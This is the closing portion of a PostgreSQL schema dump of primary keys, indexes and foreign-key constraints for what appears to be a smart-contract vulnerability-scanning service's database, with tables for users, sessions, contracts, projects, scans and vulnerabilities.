-- Name: sessions sessions_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.sessions
    ADD CONSTRAINT sessions_pkey PRIMARY KEY (id);


--
-- Name: user_preferences user_preferences_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.user_preferences
    ADD CONSTRAINT user_preferences_pkey PRIMARY KEY (user_id);


--
-- Name: users users_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.users
    ADD CONSTRAINT users_pkey PRIMARY KEY (id);


--
-- Name: vulnerabilities vulnerabilities_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.vulnerabilities
    ADD CONSTRAINT vulnerabilities_pkey PRIMARY KEY (id);


--
-- Name: ix_contract_files_contract_id; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ix_contract_files_contract_id ON public.contract_files USING btree (contract_id);


--
-- Name: ix_contracts_address; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ix_contracts_address ON public.contracts USING btree (address);


--
-- Name: ix_contracts_language; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ix_contracts_language ON public.contracts USING btree (language);


--
-- Name: ix_contracts_user_id; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ix_contracts_user_id ON public.contracts USING btree (user_id);


--
-- Name: ix_contracts_user_language_created; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ix_contracts_user_language_created ON public.contracts USING btree (user_id, language);


--
-- Name: ix_project_contracts_added; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ix_project_contracts_added ON public.project_contracts USING btree (project_id);


--
-- Name: ix_projects_created_at; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ix_projects_created_at ON public.projects USING btree (created_at);


--
-- Name: ix_projects_name; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ix_projects_name ON public.projects USING btree (name);


--
-- Name: ix_projects_user_id; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ix_projects_user_id ON public.projects USING btree (user_id);


--
-- Name: ix_saved_searches_created_at; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ix_saved_searches_created_at ON public.saved_searches USING btree (created_at DESC);


--
-- Name: ix_saved_searches_user_id; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ix_saved_searches_user_id ON public.saved_searches USING btree (user_id);


--
-- Name: ix_scans_contract_id; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ix_scans_contract_id ON public.scans USING btree (contract_id);


--
-- Name: ix_scans_failed; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ix_scans_failed ON public.scans USING btree (user_id, created_at DESC) WHERE (status = 'failed'::public.scan_status);


--
-- Name: ix_scans_scanners_used; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ix_scans_scanners_used ON public.scans USING gin (scanners_used);


--
-- Name: ix_scans_user_completed; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ix_scans_user_completed ON public.scans USING btree (user_id, completed_at DESC) WHERE (status = 'completed'::public.scan_status);


--
-- Name: ix_scans_user_id; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ix_scans_user_id ON public.scans USING btree (user_id);


--
-- Name: ix_scans_user_status_created; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ix_scans_user_status_created ON public.scans USING btree (user_id, status);


--
-- Name: ix_sessions_refresh_token; Type: INDEX; Schema: public; Owner: postgres
--

CREATE UNIQUE INDEX ix_sessions_refresh_token ON public.sessions USING btree (refresh_token);


--
-- Name: ix_sessions_token; Type: INDEX; Schema: public; Owner: postgres
--

CREATE UNIQUE INDEX ix_sessions_token ON public.sessions USING btree (token);


--
-- Name: ix_sessions_user_id; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ix_sessions_user_id ON public.sessions USING btree (user_id);


--
-- Name: ix_users_email; Type: INDEX; Schema: public; Owner: postgres
--

CREATE UNIQUE INDEX ix_users_email ON public.users USING btree (email);


--
-- Name: ix_vulnerabilities_category; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ix_vulnerabilities_category ON public.vulnerabilities USING btree (category);


--
-- Name: ix_vulnerabilities_contract_id; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ix_vulnerabilities_contract_id ON public.vulnerabilities USING btree (contract_id);


--
-- Name: ix_vulnerabilities_open; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ix_vulnerabilities_open ON public.vulnerabilities USING btree (contract_id, severity) WHERE (status = 'open'::public.vulnerability_status);


--
-- Name: ix_vulnerabilities_scan_id; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ix_vulnerabilities_scan_id ON public.vulnerabilities USING btree (scan_id);


--
-- Name: ix_vulnerabilities_scan_severity; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ix_vulnerabilities_scan_severity ON public.vulnerabilities USING btree (scan_id, severity);


--
-- Name: ix_vulnerabilities_scanner_id; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ix_vulnerabilities_scanner_id ON public.vulnerabilities USING btree (scanner_id);


--
-- Name: ix_vulnerabilities_severity; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ix_vulnerabilities_severity ON public.vulnerabilities USING btree (severity);


--
-- Name: ix_vulns_contract_severity_status; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ix_vulns_contract_severity_status ON public.vulnerabilities USING btree (contract_id, severity, status);


--
-- Name: contract_files contract_files_contract_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.contract_files
    ADD CONSTRAINT contract_files_contract_id_fkey FOREIGN KEY (contract_id) REFERENCES public.contracts(id) ON DELETE CASCADE;


--
-- Name: contracts contracts_user_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.contracts
    ADD CONSTRAINT contracts_user_id_fkey FOREIGN KEY (user_id) REFERENCES public.users(id);


--
-- Name: project_contracts project_contracts_contract_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.project_contracts
    ADD CONSTRAINT project_contracts_contract_id_fkey FOREIGN KEY (contract_id) REFERENCES public.contracts(id) ON DELETE CASCADE;


--
-- Name: project_contracts project_contracts_project_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.project_contracts
    ADD CONSTRAINT project_contracts_project_id_fkey FOREIGN KEY (project_id) REFERENCES public.projects(id) ON DELETE CASCADE;


--
-- Name: projects projects_user_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.projects
    ADD CONSTRAINT projects_user_id_fkey FOREIGN KEY (user_id) REFERENCES public.users(id) ON DELETE CASCADE;


--
-- Name: saved_searches saved_searches_user_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.saved_searches
    ADD CONSTRAINT saved_searches_user_id_fkey FOREIGN KEY (user_id) REFERENCES public.users(id) ON DELETE CASCADE;


--
-- Name: scans scans_contract_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.scans
    ADD CONSTRAINT scans_contract_id_fkey FOREIGN KEY (contract_id) REFERENCES public.contracts(id);


--
-- Name: scans scans_user_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.scans
    ADD CONSTRAINT scans_user_id_fkey FOREIGN KEY (user_id) REFERENCES public.users(id);


--
-- Name: user_preferences user_preferences_user_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.user_preferences
    ADD CONSTRAINT user_preferences_user_id_fkey FOREIGN KEY (user_id) REFERENCES public.users(id) ON DELETE CASCADE;


--
-- Name: vulnerabilities vulnerabilities_contract_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.vulnerabilities
    ADD CONSTRAINT vulnerabilities_contract_id_fkey FOREIGN KEY (contract_id) REFERENCES public.contracts(id);


--
-- Name: vulnerabilities vulnerabilities_scan_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.vulnerabilities
    ADD CONSTRAINT vulnerabilities_scan_id_fkey FOREIGN KEY (scan_id) REFERENCES public.scans(id);


--
-- PostgreSQL database dump complete
--

